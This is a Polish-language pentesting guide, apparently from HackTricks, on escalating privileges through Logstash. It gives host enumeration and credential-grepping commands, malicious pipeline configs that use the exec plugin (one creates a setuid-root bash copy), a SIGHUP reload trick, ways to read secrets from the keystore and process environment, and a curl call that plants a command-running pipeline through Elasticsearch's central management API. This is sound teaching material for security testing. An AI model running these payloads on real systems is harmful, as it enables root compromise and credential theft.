# Eskalacja uprawnień w Logstash

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash służy do **gromadzenia, przekształcania i przekazywania logów** za pośrednictwem systemu znanego jako **pipeline'y**. Pipeline'y te składają się z etapów **input**, **filter** i **output**. Interesujący aspekt pojawia się, gdy Logstash działa na zaatakowanej maszynie.

### Konfiguracja pipeline'ów

Pipeline'y są konfigurowane w pliku **/etc/logstash/pipelines.yml**, który zawiera lokalizacje konfiguracji pipeline'ów:
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Ten plik ujawnia lokalizację plików **.conf** zawierających konfiguracje pipeline'ów. W przypadku korzystania z modułu **Elasticsearch output** często zdarza się, że **pipeline'y** zawierają dane uwierzytelniające **Elasticsearch**, które zazwyczaj mają szerokie uprawnienia, ponieważ Logstash musi zapisywać dane w Elasticsearch. Wildcards w ścieżkach konfiguracji pozwalają Logstash uruchamiać wszystkie pipeline'y pasujące do wzorca w wyznaczonym katalogu.

Jeśli Logstash zostanie uruchomiony z użyciem `-f <directory>` zamiast `pipelines.yml`, **wszystkie pliki znajdujące się w tym katalogu są łączone w kolejności leksykograficznej i analizowane jako jedna konfiguracja**. Tworzy to 2 implikacje ofensywne:

- Dodany plik, taki jak `000-input.conf` lub `zzz-output.conf`, może zmienić sposób składania końcowego pipeline'u
- Nieprawidłowo sformatowany plik może uniemożliwić załadowanie całego pipeline'u, dlatego przed poleganiem na auto-reload należy dokładnie sprawdzić payloady

### Szybka enumeracja na przejętym hoście

Na hoście, na którym zainstalowano Logstash, szybko sprawdź:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Sprawdź również, czy lokalne API monitorowania jest dostępne. Domyślnie nasłuchuje na **127.0.0.1:9600**, co zazwyczaj wystarcza po uzyskaniu dostępu do hosta:
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Zwykle zwraca to identyfikatory pipeline'ów, szczegóły środowiska uruchomieniowego oraz potwierdzenie, że zmodyfikowany pipeline został załadowany.

Credentials odzyskane z Logstash często umożliwiają dostęp do **Elasticsearch**, dlatego sprawdź [tę stronę dotyczącą Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Privilege Escalation przez zapisywalne pipeline'y

Aby spróbować przeprowadzić privilege escalation, najpierw zidentyfikuj użytkownika, z którego uprawnieniami działa usługa Logstash — zazwyczaj jest to użytkownik **logstash**. Upewnij się, że spełniasz **jedno** z poniższych kryteriów:

- Masz **uprawnienia zapisu** do pliku pipeline **.conf** **lub**
- Plik **/etc/logstash/pipelines.yml** używa wildcardu, a Ty możesz zapisywać w docelowym folderze

Dodatkowo musi być spełniony **jeden** z poniższych warunków:

- Możesz zrestartować usługę Logstash **lub**
- W pliku **/etc/logstash/logstash.yml** ustawiono **config.reload.automatic: true**

Jeśli konfiguracja zawiera wildcard, utworzenie pliku pasującego do tego wildcardu umożliwia wykonanie poleceń. Na przykład:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Tutaj **interval** określa częstotliwość wykonywania w sekundach. W podanym przykładzie polecenie **whoami** jest uruchamiane co 120 sekund, a jego dane wyjściowe są kierowane do **/tmp/output.log**.

Przy ustawieniu **config.reload.automatic: true** w **/etc/logstash/logstash.yml** Logstash automatycznie wykryje i zastosuje nowe lub zmodyfikowane konfiguracje pipeline bez konieczności ponownego uruchamiania. Jeśli nie użyto wildcardu, nadal można modyfikować istniejące konfiguracje, ale zaleca się ostrożność, aby uniknąć zakłóceń.

### Bardziej niezawodne payloady pipeline

Plugin wejściowy `exec` nadal działa w bieżących wydaniach i wymaga ustawienia `interval` lub `schedule`. Wykonuje on działanie poprzez **forking** JVM Logstash, więc jeśli pamięć jest ograniczona, payload może zakończyć się błędem `ENOMEM` zamiast zostać uruchomiony po cichu.

Bardziej praktyczny payload do privilege-escalation to zazwyczaj taki, który pozostawia trwały artefakt:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
Jeśli nie masz uprawnień do restartowania, ale możesz wysłać sygnał do procesu, Logstash obsługuje również przeładowanie wyzwalane przez **SIGHUP** w systemach uniksowych:
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Pamiętaj, że nie każdy plugin obsługuje przeładowywanie. Na przykład wejście **stdin** uniemożliwia automatyczne przeładowanie, więc nie zakładaj, że `config.reload.automatic` zawsze wykryje Twoje zmiany.

### Kradzież sekretów z Logstash

Zanim skupisz się wyłącznie na code execution, zbierz dane, do których Logstash już ma dostęp:

- Poświadczenia w jawnym tekście są często wpisane na stałe w wyjściach `elasticsearch {}`, `http_poller`, wejściach JDBC lub ustawieniach związanych z cloud
- Bezpieczne ustawienia mogą znajdować się w **`/etc/logstash/logstash.keystore`** lub w innym katalogu `path.settings`
- Hasło keystore jest często przekazywane za pomocą **`LOGSTASH_KEYSTORE_PASS`**, a instalacje oparte na pakietach zazwyczaj pobierają je z **`/etc/sysconfig/logstash`**
- Rozwijanie zmiennych środowiskowych za pomocą `${VAR}` odbywa się podczas uruchamiania Logstash, dlatego warto sprawdzić środowisko usługi

Przydatne kontrole:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
Warto to również sprawdzić, ponieważ **CVE-2023-46672** wykazało, że w określonych okolicznościach Logstash może zapisywać poufne informacje w logach. Na hoście po post-exploitation stare logi Logstash i wpisy `journald` mogą zatem ujawniać dane uwierzytelniające, nawet jeśli bieżąca konfiguracja odwołuje się do keystore zamiast przechowywać sekrety bezpośrednio.

### Abuse Centralized Pipeline Management

W niektórych środowiskach host w ogóle **nie korzysta** z lokalnych plików `.conf`. Jeśli skonfigurowano **`xpack.management.enabled: true`**, Logstash może pobierać centralnie zarządzane pipeline'y z Elasticsearch/Kibana, a po włączeniu tego trybu lokalne konfiguracje pipeline'ów nie są już źródłem prawdy.

Oznacza to inną ścieżkę ataku:

1. Odzyskaj dane uwierzytelniające Elastic z lokalnych ustawień Logstash, keystore lub logów
2. Sprawdź, czy konto ma uprawnienie klastra **`manage_logstash_pipelines`**
3. Utwórz lub zastąp centralnie zarządzany pipeline, aby host Logstash wykonał Twój payload podczas następnego interwału odpytywania

API Elasticsearch używane przez tę funkcję to:
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
Jest to szczególnie przydatne, gdy pliki lokalne są tylko do odczytu, ale Logstash jest już zarejestrowany do pobierania pipelines zdalnie.

## Odnośniki

- [Elastic Docs: Ponowne ładowanie pliku konfiguracyjnego](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [Elastic Docs: Konfigurowanie scentralizowanego zarządzania pipelines](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)

{{#include ../../banners/hacktricks-training.md}}
